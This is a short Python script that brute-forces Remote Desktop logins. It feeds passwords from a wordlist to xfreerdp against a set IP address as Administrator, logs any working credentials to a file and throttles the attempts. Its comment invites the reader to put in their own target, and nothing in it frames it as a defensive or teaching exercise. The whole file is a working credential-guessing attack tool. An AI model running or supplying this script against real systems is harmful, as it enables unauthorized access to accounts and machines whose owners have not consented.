import subprocess
import time

# Replace with your target IP and wordlist
target_ip = "192.168.56.101"
username = "Administrator"
wordlist_path = "shortlist.txt"
success_log = "rdp_success.txt"

def attempt_login(password):
    password = password.strip()
    command = [
        "xfreerdp",
        f"/u:{username}",
        f"/p:{password}",
        f"/v:{target_ip}",
        "/cert:ignore"
    ]
    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
        if b"connected" in result.stdout.lower():
            print(f"[+] SUCCESS: {password}")
            with open(success_log, "a") as f:
                f.write(f"{username}:{password}\n")
            return True
        else:
            print(f"[-] Failed: {password}")
    except Exception as e:
        print(f"[!] Error: {str(e)}")
    return False

with open(wordlist_path, "r", encoding="latin-1") as f:
    for line in f:
        password = line.strip()
        if attempt_login(password):
            break
        time.sleep(1)
